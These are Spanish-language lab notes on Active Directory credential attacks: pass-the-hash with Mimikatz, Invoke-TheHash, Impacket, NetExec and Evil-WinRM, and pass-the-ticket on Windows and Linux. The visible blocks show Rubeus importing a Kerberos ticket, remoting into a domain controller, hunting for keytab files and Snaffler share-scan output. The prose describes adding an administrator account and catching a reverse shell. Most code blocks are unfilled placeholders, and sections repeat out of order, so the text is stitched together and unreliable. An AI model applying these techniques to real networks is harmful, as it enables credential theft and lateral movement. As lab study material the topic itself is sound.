      gwJFGpR++u1h//+4Zi++gjsX/+vD3Tx4YUAsMiOaOZRiYgBWWxsI02NYyGSBIwRC3yGwzQAoIT43EhAu
      HjYiDIdccqxpB1+8vGwkkV7DEcFM1XFwjuREzYWafF0OUfCT69ZIsOqEwimsHDyfr6WhuKua034Us2/V
      8wYbbKYjVj+jgfEwge6gAwIBAKKB5gSB432B4DCB3aCB2jCB1zCB1KArMCmgAwIBEqEiBCDlV0Bp6+en
      HH9/2tewMMt8rq0f7ipDd/UaU4HUKUFaHaETGxFJTkxBTkVGUkVJR0hULkhUQqIRMA+gAwIBAaEIMAYb
      BGpvaG6jBwMFAEDhAAClERgPMjAyMjA3MTgxMjQ0NTBaphEYDzIwMjIwNzE4MjI0NDUwWqcRGA8yMDIy
      MDcyNTEyNDQ1MFqoExsRSU5MQU5FRlJFSUdIVC5IVEKpJjAkoAMCAQKhHTAbGwZrcmJ0Z3QbEWlubGFu
      ZWZyZWlnaHQuaHRi
[+] Ticket successfully imported!

  ServiceName              :  krbtgt/inlanefreight.htb
  ServiceRealm             :  INLANEFREIGHT.HTB
  UserName                 :  john
  UserRealm                :  INLANEFREIGHT.HTB
  StartTime                :  7/18/2022 5:44:50 AM
  EndTime                  :  7/18/2022 3:44:50 PM
  RenewTill                :  7/25/2022 5:44:50 AM
  Flags                    :  name_canonicalize, pre_authent, initial, renewable, forwardable
  KeyType                  :  aes256_cts_hmac_sha1
  Base64(key)              :  5VdAaevnpxx/f9rXsDDLfK6tH+4qQ3f1GlOB1ClBWh0=
  ASREP (key)              :  9279BCBD40DB957A0ED0D3856B2E67F9BB58E6DC7FC07207D0763CE2713F11DC

c:\tools>powershell
Windows PowerShell
Copyright (C) 2015 Microsoft Corporation. All rights reserved.

PS C:\tools> Enter-PSSession -ComputerName DC01
[DC01]: PS C:\Users\john\Documents> whoami
inlanefreight\john
[DC01]: PS C:\Users\john\Documents> hostname
DC01
```



![Pasted image 20250708015148.png](/img/user/imgs/Pasted%20image%2020250708015148.png)


![Pasted image 20250708020249.png](/img/user/imgs/Pasted%20image%2020250708020249.png)


``` css
Enter-PSSession -ComputerName DC01
```

![Pasted image 20250708020740.png](/img/user/imgs/Pasted%20image%2020250708020740.png)




# Pass the Ticket (Linux)


Aunque no es común, las computadoras Linux pueden conectarse a Active Directory para proporcionar una gestión de identidad centralizada e integrarse con los sistemas de la organización, brindando a los usuarios la capacidad de tener una única identidad para autenticarse en computadoras Linux y Windows. 


Un equipo Linux conectado a Active Directory suele usar ``Kerberos`` como método de autenticación. Supongamos que este es el caso y logramos comprometer una máquina Linux conectada a Active Directory. En ese caso, podríamos intentar encontrar tickets Kerberos para suplantar la identidad de otros usuarios y obtener más acceso a la red. 


## Script

Para practicar y entender cómo podemos abusar de Kerberos desde un sistema Linux, tenemos una computadora ( LINUX01) conectado al controlador de dominio. 

![Pasted image 20250708021848.png](/img/user/imgs/Pasted%20image%2020250708021848.png)



# Autenticación de Linux mediante reenvío de puertos

``` css
MrBloody@htb[/htb]$ ssh david@inlanefreight.htb@10.129.204.23 -p 2222

david@inlanefreight.htb@10.129.204.23's password: 
Welcome to Ubuntu 20.04.5 LTS (GNU/Linux 5.4.0-126-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Tue 11 Oct 2022 09:30:58 AM UTC

  System load:  0.09               Processes:               227
  Usage of /:   38.1% of 13.70GB   Users logged in:         2
  Memory usage: 32%                IPv4 address for ens160: 172.16.1.15
  Swap usage:   0%

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

12 updates can be applied immediately.
To see these additional updates run: apt list --upgradable

New release '22.04.1 LTS' available.
Run 'do-release-upgrade' to upgrade to it.


Last login: Tue Oct 11 09:30:46 2022 from 172.16.1.5
david@inlanefreight.htb@linux01:~$ 

```


## Identifying Linux and Active Directory Integration


Podemos identificar si la máquina Linux está unida a un dominio usando ``realm`` , una herramienta utilizada para administrar la inscripción del sistema en un dominio y establecer qué usuarios o grupos del dominio tienen permiso para acceder a los recursos del sistema local. 


###### realm - Checks if the Linux machine is joined to the domain
``` css
david@inlanefreight.htb@linux01:~$ realm list

inlanefreight.htb
  type: kerberos
  realm-name: INLANEFREIGHT.HTB
  domain-name: inlanefreight.htb
  configured: kerberos-member
  server-software: active-directory
  client-software: sssd
  required-package: sssd-tools
  required-package: sssd
  required-package: libnss-sss
  required-package: libpam-sss
  required-package: adcli
  required-package: samba-common-bin
  login-formats: %U@inlanefreight.htb
  login-policy: allow-permitted-logins
  permitted-logins: david@inlanefreight.htb, julio@inlanefreight.htb
  permitted-groups: Linux Admins
```


###### Comprueba si la maquina Linux está unida al dominio

``` css
david@inlanefreight.htb@linux01:~$ ps -ef | grep -i "winbind\|sssd"

root        2140       1  0 Sep29 ?        00:00:01 /usr/sbin/sssd -i --logger=files
root        2141    2140  0 Sep29 ?        00:00:08 /usr/libexec/sssd/sssd_be --domain inlanefreight.htb --uid 0 --gid 0 --logger=files
root        2142    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_nss --uid 0 --gid 0 --logger=files
root        2143    2140  0 Sep29 ?        00:00:03 /usr/libexec/sssd/sssd_pam --uid 0 --gid 0 --logger=files

```


# Cómo encontrar tickets Kerberos en Linux

Como atacantes, siempre buscamos credenciales. En máquinas unidas a un dominio Linux, buscamos tickets Kerberos para obtener más acceso. Los tickets Kerberos se pueden encontrar en diferentes lugares según la implementación de Linux o si el administrador cambia la configuración predeterminada. Exploremos algunas formas comunes de encontrar tickets Kerberos. 


## Use Find to search for files with keytab in the name

``` css
david@inlanefreight.htb@linux01:~$ find / -name *keytab* -ls 2>/dev/null

...SNIP...

   131610      4 -rw-------   1 root     root         1348 Oct  4 16:26 /etc/krb5.keytab
   262169      4 -rw-rw-rw-   1 root     root          216 Oct 12 15:13 /opt/specialfiles/carlos.keytab
```


##### Identificación de archivos KeyTab en Cronjobs 

``` css
carlos@inlanefreight.htb@linux01:~$ crontab -l

# Edit this file to introduce tasks to be run by cron.
# 
...SNIP...
# 
# m h  dom mon dow   command
*5/ * * * * /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
carlos@inlanefreight.htb@linux01:~$ cat /home/carlos@inlanefreight.htb/.scripts/kerberos_script_test.sh
#!/bin/bash

kinit svc_workstations@INLANEFREIGHT.HTB -k -t /home/carlos@inlanefreight.htb/.scripts/svc_workstations.kt
smbclient //dc01.inlanefreight.htb/svc_workstations -c 'ls'  -k -no-pass > /home/carlos@inlanefreight.htb/script-test-results.txt
```






---

#password #hash #AD #activeDirectory #SAM #lsass #pass-the-hash

---


`` `$

Todas las herramientas cubiertas en esta sección generan un ``'large amount of information'``, si bien ayudan con la automatización, generalmente se requiere una buena cantidad de revisión manual, ya que muchas coincidencias puede ser ``'false positive'``. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de *Snaffler* son:

![Pasted image 20250702015444.png](/img/user/imgs/Pasted%20image%2020250702015444.png)

#### PowerHuntShares

Otra herramienta que se puede utilizar es ``PowerHuntShares`` , un script de *PowerShell* que no necesariamente debe ejecutarse en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un ``HTML report`` al finalizar, se proporciona una interfaz de usuario fácil de usar para revisar los resultados:

![Pasted image 20250702015847.png](/img/user/imgs/Pasted%20image%2020250702015847.png)

Podemos ejecutar un escaneo básico usando ``PowerHuntShares`` así: 

{{CODE_BLOCK_35}}


### Hunting from Linux

#### MANSPIDER

Si no tenemos acceso a un equipo unido al dominio, o simplemente preferimos buscar archivos de forma remota, herramientas como ``MANSPIDER`` nos permiten escanear recursos compartidos SMB desde Linux. 

{{CODE_BLOCK_36}}


#### NetExec

Además de sus muchos otros usos, ``NetExec`` También se puede utilizar para buscar recursos compartidos de red mediante el ``--spider`` opción. Esta función se describe con gran detalle en la wiki oficial . 


Esta función se describe con gran detalle en la wiki oficial . Un análisis básico de recursos compartidos de red para archivos que contengan la cadena **"passw"** Se puede ejecutar así:

{{CODE_BLOCK_37}}


![Pasted image 20250702060047.png](/img/user/imgs/Pasted%20image%2020250702060047.png)

![Pasted image 20250702060341.png](/img/user/imgs/Pasted%20image%2020250702060341.png)



![Pasted image 20250702215635.png](/img/user/imgs/Pasted%20image%2020250702215635.png)


![Pasted image 20250704011534.png](/img/user/imgs/Pasted%20image%2020250704011534.png)


---

# Pass the Hash (PtH)

Es una técnica que consiste en que un atacante utiliza un ``hash`` de contraseña en lugar de la contraseña en texto plano para la autenticación. El atacante no necesita descifrar el hash para obtener una contraseña en texto plano. 

Los ``ataques PtH`` explotan el protocolo de autenticación, ya que el hash de la contraseña permanece estático en cada sesión hasta que se cambia la contraseña. 

![Pasted image 20250704024045.png](/img/user/imgs/Pasted%20image%2020250704024045.png)


> [!NOTE] NOTA:
> Las herramientas que utilizaremos se encuentran en el directorio *C:\tools* en el host de destino. Una vez que inicie la máquina y complete los ejercicios, podrá usar las herramientas en ese directorio. Este laboratorio consta de dos máquinas: *tendrá acceso a una (MS01) y, desde allí, se conectará a la segunda (DC01)*. 


## Introduction to Windows NTML


**El Administrador de LAN de nuevas Tecnologías de Windows (NTML)** de Microsoft, es un conjunto de protocolos de seguridad que autentica la identidad de los usuarios a la vez que protege la integridad y confidencialidad de sus datos. 

NTLM es una solución de inicio de sesión único (SSO) que utiliza un protocolo de desafío-respuesta para verificar la identidad del usuario sin necesidad de proporcionar una contraseña.

Con NTLM, las contraseñas almacenadas en el servidor y el controlador de dominio no están "salteadas", lo que significa que un adversario con un hash de contraseña puede autenticar una sesión sin conocer la contraseña original. A esto le llamamos...`Pass the Hash (PtH) Attack`.


### Pass the Hash with Mimikatz (Windows)

Las primeras herramientas que usaremos para realizar un ataque Pass the Hash es ``MIMIKATZ``. ``Mimikatz`` tiene un módulo llamado `sekurlsa::pth`. Esto nos permite realizar un ataque PASS-THE-HASH iniciando un proceso con el hash de la password del usuario. Para usar el módulo necesitamos lo siguiente:


![Pasted image 20250704025120.png](/img/user/imgs/Pasted%20image%2020250704025120.png)

#### Pass the hash from Windows using Mimikatz

{{CODE_BLOCK_38}}


Usaremos cmd.exe para ejecutar comandos en el contexto del usuario. Por ejemplo `julio` puede conectarse a una carpeta llamada `julio` en el DC.

![Pasted image 20250704025326.png](/img/user/imgs/Pasted%20image%2020250704025326.png)


#### Pass the Hash with Powershell Invoke-TheHash (Windows)

Otra herramienta que podemos usar para realizar ataques de ``Pass the Hash`` en Windows es ``Invoke-TheHash`` . Esta herramienta es un conjunto de funciones de ``PowerShell`` para realizar ataques de ``Pass the Hash`` con ``WMI`` y ``SMB``.

La autenticación se realiza pasando un Hash NTML al protocolo de autenticación NTLMv2. `No se requieren privilegios de administrator local en el lado del cliente`, pero el usuario y el hash que usamos para la autenticación deben tener derechos administrativos en el equipo destino.


![Pasted image 20250704025952.png](/img/user/imgs/Pasted%20image%2020250704025952.png)



El siguiente comando utilizará el método SMB para la ejecución de comandos para crear un nuevo usuario llamado ``mark`` y agregarlo al grupo ``Administradores``. 


{{CODE_BLOCK_39}}


También podemos obtener una conexión de Shell inversa en la máquina de destino.

Para obtener un Shell inverso, necesitamos iniciar nuestro oyente usando Netcat en nuestra máquina Windows, que tiene la ``dirección IP 172.16.1.5`` usaremos el puerto *8001* para esperar la conexión. 

![Pasted image 20250704030231.png](/img/user/imgs/Pasted%20image%2020250704030231.png)


Para crear un Shell inverso simple usando ``PowerShell``, podemos visitar ``revshells.com`` , configurar nuestra IP ``172.16.1.5 ``y puerto ``8001``, y seleccione la opción PowerShell #3 (Base64), como se muestra en la siguiente imagen. 

![Pasted image 20250704030309.png](/img/user/imgs/Pasted%20image%2020250704030309.png)


Ahora podemos ejecutar ``Invoke-TheHash``, para ejecutar nuestro script de Shell inverso de PowerShell en el equipo de destino. Observe que, en lugar de proporcionar la dirección IP, que es ``172.16.1.10``, usaremos el nombre de la máquina DC01(cualquiera funcionaría). 


##### Invoke-Thehash con WMI


{{CODE_BLOCK_40}}

El resultado es una conexión de shell inversa desde el host DC01 (172.16.1.10). 


![Pasted image 20250704030521.png](/img/user/imgs/Pasted%20image%2020250704030521.png)

## Pass the Hash with Impacket (Linux)

[Impacket](https://github.com/SecureAuthCorp/impacket) tiene varias herramientas que podemos utilizar para diferentes operaciones como: `Command Execution` y `Credential Dumping`, `Enumeration`, etc. 


### Pass the Hash with Impacket PsExec

{{CODE_BLOCK_41}}

Hay varias otras herramientas en el kit de herramientas Impacket que podemos usar para la ejecución de comandos mediante ataques Pass the Hash, como:

- [impacket-wmiexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/wmiexec.py)
- [impacket-atexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/atexec.py)
- [impacket-smbexec](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py)


# Pass the Hash with NetExec (Linux)

[Netexec](https://github.com/Pennyw0rth/NetExec) es una herramienta de ``post-explotación`` que ayuda a automatizar la evaluación de la seguridad de grandes redes de ``Active Directory``. Podemos usar ``NetExec`` para intentar autenticarnos en algunos o todos los hosts de una red, buscando un host donde podamos autenticarnos correctamente como administrador local. Este método también se denomina "Spray de contraseñas". el módulo `Active Directory Enumeration & Attacks`. Tenga en cuenta que este método puede bloquear cuentas de dominio.



#### Pass the hash with Netexec

{{CODE_BLOCK_42}}


Si queremos realizar las mismas acciones pero intentar autenticarnos en cada host en una subred usando el hash de contraseña del administrador local, podríamos agregar `--local-auth` a nuestro comando. 

Este método es útil si obtenemos un hash de administrador local volcando la base de datos SAM local en un host y queremos comprobar a cuántos otros hosts (si los hay) podemos acceder gracias a la reutilización de la contraseña de administrador.

Si vemos `Pwn3d!` significa que el usuario es administrador local en el equipo de destino. 


#### NetExec - Command Execution

{{CODE_BLOCK_43}}

Revise la [documentación Wiki de NetExec](https://www.netexec.wiki/) para obtener más información sobre las amplias funciones de la herramienta.


# Pass the Hash with Evil-Winrm (Linux)

``Evil-WinRM`` es otra herramienta que podemos usar para autenticarnos mediante el ataque ``"Pasar el Hash"`` con comunicación remota de PowerShell. Si SMB está bloqueado o no tenemos permisos de administrador, podemos usar este protocolo alternativo para conectarnos a la máquina objetivo.

 
## Pass the Hash with Evil-Winrm

{{CODE_BLOCK_44}}


# Pass the Hash with RDP

Podemos realizar un ataque RDP Pth para obtener acceso GUI al sistema de destino utilizando herramientas como `xfreerdp`.

Este ataque tiene algunas salvedades:

``Restricted Admin Mode``, que está deshabilitado de forma predeterminada, debe estar habilitado en el host de destino; de lo contrario, se le presentará el siguiente error:

![Pasted image 20250707020740.png](/img/user/imgs/Pasted%20image%2020250707020740.png)

Esto se puede habilitar agregando una nueva clave de registro `DisableRestrictedAdmin` (REG_DWORD) bajo ``HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Lsa`` con el valor 0. Se puede hacer usando el siguiente comando:

#### Enable Restricted Admin Mode to allow PtH

{{CODE_BLOCK_45}}

![Pasted image 20250707021048.png](/img/user/imgs/Pasted%20image%2020250707021048.png)


Una vez agregada la clave de registro, podemos usar ``xfreerdp`` con la opción ``/pth`` para obtener acceso RDP:

### Pass the hash via RDP

{{CODE_BLOCK_46}}


![Pasted image 20250707021352.png](/img/user/imgs/Pasted%20image%2020250707021352.png)


# UAC Pass the Hash Limits for Local Accounts

El UAC (Control de cuentas de usuario) limita la capacidad de los usuarios locales para realizar operaciones de administración remota. Cuando la clave de registro...

``HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy`` si se establece en 0, significa que la cuenta de administrador local integrada ``(RID-500, "Administrador")`` es la única cuenta local autorizada para realizar tareas de administración remota. Si se establece en 1, también se permiten las demás cuentas de administrador local. 


> [!NOTE] Nota:
> Hay una excepción, si la clave de registro ``FilterAdministratorToken`` (deshabilitado por defecto) está habilitado (valor 1), la cuenta RID 500 ``(incluso si se le cambia el nombre)`` está inscrita en la protección ``UAC``. Esto significa que el ``PTH remoto`` fallará contra la máquina al usar esa cuenta. 


Estas configuraciones son solo para cuentas administrativas locales. Si accedemos a una cuenta de dominio con derechos administrativos en un equipo, podemos usar Pass-the-Hash en ese equipo.


![Pasted image 20250707031058.png](/img/user/imgs/Pasted%20image%2020250707031058.png)

![Pasted image 20250707033800.png](/img/user/imgs/Pasted%20image%2020250707033800.png)

{{CODE_BLOCK_47}}


## Pass the Ticket (PtT) Windows

Otro método para realizar ataques laterales en un entorno Active Directory se denomina `ataque Pass the Ticket (PtT)`. En este ataque, se utiliza un ticket Kerberos robado para realizar ataques laterales en lugar de un Hash de password NTML.


## Kerberos Protocol Update

El sistema de autenticación Kerberos se basa en tickets. La idea central de Kerberos no es asignar una contraseña a cada servicio que se utiliza.

En su lugar, Kerberos conserva todos los tickets en el sistema local y presenta a cada servicio únicamente el ticket específico, lo que impide que un ticket se utilice para otro fin.

![Pasted image 20250707213119.png](/img/user/imgs/Pasted%20image%2020250707213119.png)

Cuando un usuario solicita un TGT, deben autenticarse ante el controlador de dominio cifrando la marca de tiempo actual con el hash de su password. Una vez que el controlador de dominio valida la identidad del usuario (dado que el dominio conoce el hash de su password, lo que significa que puede descifrar la marca de tiempo), le envía un TGT para futuras solicitudes.

Una vez que el usuario recibe su ticket, no tiene que demostrar su identidad con su contraseña.

## Pass the Ticket (PtT) Attack

Necesitamos un ticket ``Kerberos`` válido para realizar un ataque ``Pass the Ticket (PtT)``. Puede ser:

![Pasted image 20250707214358.png](/img/user/imgs/Pasted%20image%2020250707214358.png)

Antes de realizar un ataque `Pass the Ticket (PtT)`, veamos algunos métodos para obtener un ticket usando `Mimikatz` y `Rubeus`

### Script

Imaginemos que estamos realizando una prueba de penetración y conseguimos suplantar la identidad de un usuario y acceder a su ordenador. 

Encontramos una forma de obtener privilegios administrativos en este ordenador y trabajamos con derechos de administrador local.


#### Collecting Kerberos tickets from Windows

En Windows, los tickets son procesados ​​y almacenados por el proceso LSASS (Servicio del Subsistema de Autoridad de Seguridad Local). Por lo tanto, para obtener un ticket de un sistema Windows, debe comunicarse con LSASS y solicitarlo.

``Como usuario no administrador, solo puede obtener sus tickets``, pero como administrador local, puede recopilar todo.

Podemos recolectar todos los tickets de un sistema usando el módulo `Mimikatz` `sekurlsa::tickets /export` el resultado es una lista de archivos con la extensión `.kirbi`, que contenían los tickets.


# Mimikatz - Ticket Export

{{CODE_BLOCK_48}}

Los billetes que terminan con ``$``, corresponden a la cuenta del equipo, que necesita un ticket para interactuar con Active Directory. 

Los tickets de usuario contienen el nombre del usuario, seguido de un ...``@`` que separa del servicio y el dominio, por ejemplo: 

``[randomvalue]-username@service-domain.local.kirbi``



> [!NOTE] Nota:
> Si eliges un ticket con el servicio krbtgt, corresponde al TGT de esa cuenta. 

también podemos exportar tickets usando `Rubeus` y la opción `dump` se puede utilizar para volcar todos los tickets (si se ejecuta como administrator local)


# Rubeus - Exports Tickets

{{CODE_BLOCK_49}}



> [!NOTE] Nota:
> 

Para recolectar todos los tickets necesitamos ejecutar ``Mimikatz`` o ``Rubeus`` como administrador.


# Pase el ticket con PowerShell Remoting (Windows) 

PowerShell Remoting permite ejecutar scripts o comandos en un equipo remoto. Los administradores suelen usar PowerShell Remoting para administrar equipos remotos en la red. Al habilitar PowerShell Remoting, se crean escuchas HTTP y HTTPS. La escucha se ejecuta en el puerto estándar TCP/5985 para HTTP y TCP/5986 para HTTPS. 


Supongamos que encontramos una cuenta de usuario sin privilegios administrativos en un equipo remoto, pero que pertenece al grupo Usuarios de administración remota. En ese caso, podemos usar PowerShell Remoting para conectarnos a ese equipo y ejecutar comandos. 


## Mimikatz - PowerShell Remoting with Pass the Ticket


Para usar PowerShell Remoting con Pass the Ticket, podemos usar Mimikatz para importar nuestro ticket y luego abrir una consola de PowerShell y conectarnos a la máquina de destino.

{{CODE_BLOCK_50}}



## Rubeus - PowerShell Remote Connection with Pass the Ticket

Rubeus tiene la opción de `createnetonly`, que crea un proceso de sacrificio/sesión de inicio de sesión ([tipo de inicio de sesión 9](https://eventlogxp.com/blog/logon-type-what-does-it-mean/)). El proceso está oculto por defecto, pero podemos especificar el indicador. `/show` para mostrar el proceso, y el resultado es el equivalente a `runas /netonly`. Esto evita el borrado de los TGT existentes para la sesión de inicio de sesión actual.


### Create a sacrifice process with Rubeus

{{CODE_BLOCK_51}}


El comando anterior abrirá una nueva ventana de comandos. Desde allí, podemos ejecutar Rubeus para solicitar un nuevo TGT con la opción `/ptt` para importar el ticket a nuestra sesión actual  



## Rubeus - Pass the Ticket for lateral movement


{{CODE_BLOCK_52}}



![Pasted image 20250708015148.png](/img/user/imgs/Pasted%20image%2020250708015148.png)


![Pasted image 20250708020249.png](/img/user/imgs/Pasted%20image%2020250708020249.png)


{{CODE_BLOCK_53}}

![Pasted image 20250708020740.png](/img/user/imgs/Pasted%20image%2020250708020740.png)




# Pass the Ticket (Linux)


Aunque no es común, las computadoras Linux pueden conectarse a Active Directory para proporcionar una gestión de identidad centralizada e integrarse con los sistemas de la organización, brindando a los usuarios la capacidad de tener una única identidad para autenticarse en computadoras Linux y Windows. 


Un equipo Linux conectado a Active Directory suele usar ``Kerberos`` como método de autenticación. Supongamos que este es el caso y logramos comprometer una máquina Linux conectada a Active Directory. En ese caso, podríamos intentar encontrar tickets Kerberos para suplantar la identidad de otros usuarios y obtener más acceso a la red. 


## Script

Para practicar y entender cómo podemos abusar de Kerberos desde un sistema Linux, tenemos una computadora ( LINUX01) conectado al controlador de dominio. 

![Pasted image 20250708021848.png](/img/user/imgs/Pasted%20image%2020250708021848.png)



# Autenticación de Linux mediante reenvío de puertos

{{CODE_BLOCK_54}}


## Identifying Linux and Active Directory Integration


Podemos identificar si la máquina Linux está unida a un dominio usando ``realm`` , una herramienta utilizada para administrar la inscripción del sistema en un dominio y establecer qué usuarios o grupos del dominio tienen permiso para acceder a los recursos del sistema local. 


###### realm - Checks if the Linux machine is joined to the domain
{{CODE_BLOCK_55}}


###### Comprueba si la maquina Linux está unida al dominio

{{CODE_BLOCK_56}}


# Cómo encontrar tickets Kerberos en Linux

Como atacantes, siempre buscamos credenciales. En máquinas unidas a un dominio Linux, buscamos tickets Kerberos para obtener más acceso. Los tickets Kerberos se pueden encontrar en diferentes lugares según la implementación de Linux o si el administrador cambia la configuración predeterminada. Exploremos algunas formas comunes de encontrar tickets Kerberos. 


## Use Find to search for files with keytab in the name

{{CODE_BLOCK_57}}


##### Identificación de archivos KeyTab en Cronjobs 

{{CODE_BLOCK_58}}






---

#password #hash #AD #activeDirectory #SAM #lsass #pass-the-hash

---


`` $'     $""   $$$c
 88b    dP 888    Y88 888   888,888     888   o88oo,.__888oo,__ 888b '88bo,
  'YMmMY'  MMM     YM YMM   ''` 'MM,    'MM,  ''''YUMMM''''YUMMMMMMM   'W'
                         by l0ss and Sh3r4 - github.com/SnaffCon/Snaffler


[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:42Z [Info] Parsing args...
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Parsed args successfully.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking DFS Discovery because no ComputerTargets or PathTargets were specified
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting DFS paths from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Found 0 DFS Shares in 0 namespaces.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Invoking full domain computer discovery.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Getting computers from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Got 1 computers from AD.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Starting to look for readable shares...
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Info] Created all sharefinder tasks.
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Black}<\\DC01.inlanefreight.local\ADMIN$>()
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\ADMIN$>(R) Remote Admin
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Black}<\\DC01.inlanefreight.local\C$>()
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\C$>(R) Default share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Company>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Finance>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\HR>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\IT>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Marketing>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\NETLOGON>(R) Logon server share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\Sales>(R)
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:43Z [Share] {Green}<\\DC01.inlanefreight.local\SYSVOL>(R) Logon server share
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:51Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\ADMIN$\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:53Z [File] {Yellow}<KeepDeployImageByExtension|R|^\.wim$|29.2MB|2022-02-25 16:36:53Z>(\\DC01.inlanefreight.local\ADMIN$\Containers\serviced\WindowsDefenderApplicationGuard.wim) .wim
[INLANEFREIGHT\jbader@DC01] 2025-05-01 17:41:58Z [File] {Red}<KeepPassOrKeyInCode|R|passw?o?r?d?>\s*[^\s<]+\s*<|2.3kB|2025-05-01 05:22:48Z>(\\DC01.inlanefreight.local\C$\Windows\Panther\unattend.xml) 5"\ language="neutral"\ versionScope="nonSxS"\ xmlns:wcm="http://schemas\.microsoft\.com/WMIConfig/2002/State"\ xmlns:xsi="http://www\.w3\.org/2001/XMLSchema-instance">\n\t\t\ \ <UserAccounts>\n\t\t\ \ \ \ <AdministratorPassword>\*SENSITIVE\*DATA\*DELETED\*</AdministratorPassword>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ </UserAccounts>\n\ \ \ \ \ \ \ \ \ \ \ \ <OOBE>\n\ \ \ \ \ \ \ \ \ \ \ \ \ \ \ \ <HideEULAPage>true</HideEULAPage>\n\ \ \ \ \ \ \ \ \ \ \ \ </OOBE>\n\ \ \ \ \ \ \ \ </component
<SNIP>
```

Todas las herramientas cubiertas en esta sección generan un ``'large amount of information'``, si bien ayudan con la automatización, generalmente se requiere una buena cantidad de revisión manual, ya que muchas coincidencias puede ser ``'false positive'``. Dos parámetros útiles que pueden ayudar a refinar el proceso de búsqueda de *Snaffler* son:

![Pasted image 20250702015444.png](/img/user/imgs/Pasted%20image%2020250702015444.png)

#### PowerHuntShares

Otra herramienta que se puede utilizar es ``PowerHuntShares`` , un script de *PowerShell* que no necesariamente debe ejecutarse en una máquina unida a un dominio. Una de sus funciones más útiles es que genera un ``HTML report`` al finalizar, se proporciona una interfaz de usuario fácil de usar para revisar los resultados:

![Pasted image 20250702015847.png](/img/user/imgs/Pasted%20image%2020250702015847.png)

Podemos ejecutar un escaneo básico usando ``PowerHuntShares`` así: 

{{CODE_BLOCK_35}}


### Hunting from Linux

#### MANSPIDER

Si no tenemos acceso a un equipo unido al dominio, o simplemente preferimos buscar archivos de forma remota, herramientas como ``MANSPIDER`` nos permiten escanear recursos compartidos SMB desde Linux. 

{{CODE_BLOCK_36}}


#### NetExec

Además de sus muchos otros usos, ``NetExec`` También se puede utilizar para buscar recursos compartidos de red mediante el ``--spider`` opción. Esta función se describe con gran detalle en la wiki oficial . 


Esta función se describe con gran detalle en la wiki oficial . Un análisis básico de recursos compartidos de red para archivos que contengan la cadena **"passw"** Se puede ejecutar así:

{{CODE_BLOCK_37}}


![Pasted image 20250702060047.png](/img/user/imgs/Pasted%20image%2020250702060047.png)

![Pasted image 20250702060341.png](/img/user/imgs/Pasted%20image%2020250702060341.png)



![Pasted image 20250702215635.png](/img/user/imgs/Pasted%20image%2020250702215635.png)


![Pasted image 20250704011534.png](/img/user/imgs/Pasted%20image%2020250704011534.png)


---

# Pass the Hash (PtH)

